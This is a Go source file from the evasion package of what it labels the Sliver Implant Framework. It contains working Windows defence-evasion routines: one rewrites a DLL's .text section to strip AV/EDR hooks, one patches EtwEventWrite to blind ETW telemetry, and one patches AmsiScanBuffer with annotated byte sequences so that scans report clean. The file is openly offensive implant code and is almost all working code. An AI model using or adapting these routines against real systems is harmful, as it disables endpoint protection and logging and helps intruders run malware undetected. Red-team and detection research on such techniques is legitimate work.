package evasion

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"golang.org/x/sys/windows"

	//{{if .Config.Debug}}
	"log"
	//{{end}}
	"debug/pe"
	"unsafe"
)

// RefreshPE reloads a DLL from disk into the current process
// in an attempt to erase AV or EDR hooks placed at runtime.
func RefreshPE(name string) error {
	//{{if .Config.Debug}}
	log.Printf("Reloading %s...\n", name)
	//{{end}}
	f, e := pe.Open(name)
	if e != nil {
		return e
	}

	x := f.Section(".text")
	ddf, e := x.Data()
	if e != nil {
		return e
	}
	return writeGoodBytes(ddf, name, x.VirtualAddress, x.Name, x.VirtualSize)
}

func writeGoodBytes(b []byte, pn string, virtualoffset uint32, secname string, vsize uint32) error {
	t, e := windows.LoadDLL(pn)
	if e != nil {
		return e
	}
	h := t.Handle
	dllBase := uintptr(h)

	dllOffset := uint(dllBase) + uint(virtualoffset)

	var old uint32
	e = windows.VirtualProtect(uintptr(dllOffset), uintptr(vsize), windows.PAGE_EXECUTE_READWRITE, &old)
	if e != nil {
		return e
	}
	//{{if .Config.Debug}}
	log.Println("Made memory map RWX")
	//{{end}}

	// vsize should always smaller than len(b)
	for i := 0; i < int(vsize); i++ {
		loc := uintptr(dllOffset + uint(i))
		mem := (*[1]byte)(unsafe.Pointer(loc))
		(*mem)[0] = b[i]
	}

	//{{if .Config.Debug}}
	log.Println("DLL overwritten")
	//{{end}}
	e = windows.VirtualProtect(uintptr(dllOffset), uintptr(vsize), old, &old)
	if e != nil {
		return e
	}
	//{{if .Config.Debug}}
	log.Println("Restored memory map permissions")
	//{{end}}
	return nil
}

// PatchETW patches EtwEventWrite in ntdll to return immediately,
// blinding ETW-based telemetry (e.g. .NET CLR, PowerShell, Defender).
func PatchETW() error {
	ntdll, err := windows.LoadDLL("ntdll.dll")
	if err != nil {
		return err
	}
	etwEventWrite, err := ntdll.FindProc("EtwEventWrite")
	if err != nil {
		return err
	}
	// xor rax, rax; ret (return 0 = STATUS_SUCCESS)
	patch := []byte{0x48, 0x33, 0xC0, 0xC3}
	var old uint32
	err = windows.VirtualProtect(etwEventWrite.Addr(), uintptr(len(patch)), windows.PAGE_EXECUTE_READWRITE, &old)
	if err != nil {
		return err
	}
	for i := 0; i < len(patch); i++ {
		loc := uintptr(etwEventWrite.Addr() + uintptr(i))
		mem := (*[1]byte)(unsafe.Pointer(loc))
		(*mem)[0] = patch[i]
	}
	return windows.VirtualProtect(etwEventWrite.Addr(), uintptr(len(patch)), old, &old)
}

// PatchAMSI patches AmsiScanBuffer in amsi.dll to write AMSI_RESULT_CLEAN
// to the result output parameter and return S_OK.
//
// AmsiScanBuffer signature (x64):
//   HRESULT AmsiScanBuffer(rcx, rdx, r8, r9, [rsp+28h], [rsp+30h])
//   6th param (result ptr) is at [rsp+30h] after the call pushes the return address.
//
// Patch disassembly:
//   48 8B 44 24 30    mov rax, [rsp+30h]   ; load AMSI_RESULT* from 6th param
//   C7 00 00 00 00 00 mov dword [rax], 0    ; *result = AMSI_RESULT_CLEAN (0)
//   33 C0             xor eax, eax          ; return S_OK (0)
//   C3                ret
func PatchAMSI() error {
	amsi, err := windows.LoadDLL("amsi.dll")
	if err != nil {
		return err
	}
	amsiScanBuffer, err := amsi.FindProc("AmsiScanBuffer")
	if err != nil {
		return err
	}
	patch := []byte{
		0x48, 0x8B, 0x44, 0x24, 0x30, // mov rax, [rsp+30h]
		0xC7, 0x00, 0x00, 0x00, 0x00, 0x00, // mov dword [rax], 0
		0x33, 0xC0, // xor eax, eax
		0xC3, // ret
	}
	var old uint32
	err = windows.VirtualProtect(amsiScanBuffer.Addr(), uintptr(len(patch)), windows.PAGE_EXECUTE_READWRITE, &old)
	if err != nil {
		return err
	}
	for i := 0; i < len(patch); i++ {
		loc := uintptr(amsiScanBuffer.Addr() + uintptr(i))
		mem := (*[1]byte)(unsafe.Pointer(loc))
		(*mem)[0] = patch[i]
	}
	return windows.VirtualProtect(amsiScanBuffer.Addr(), uintptr(len(patch)), old, &old)
}
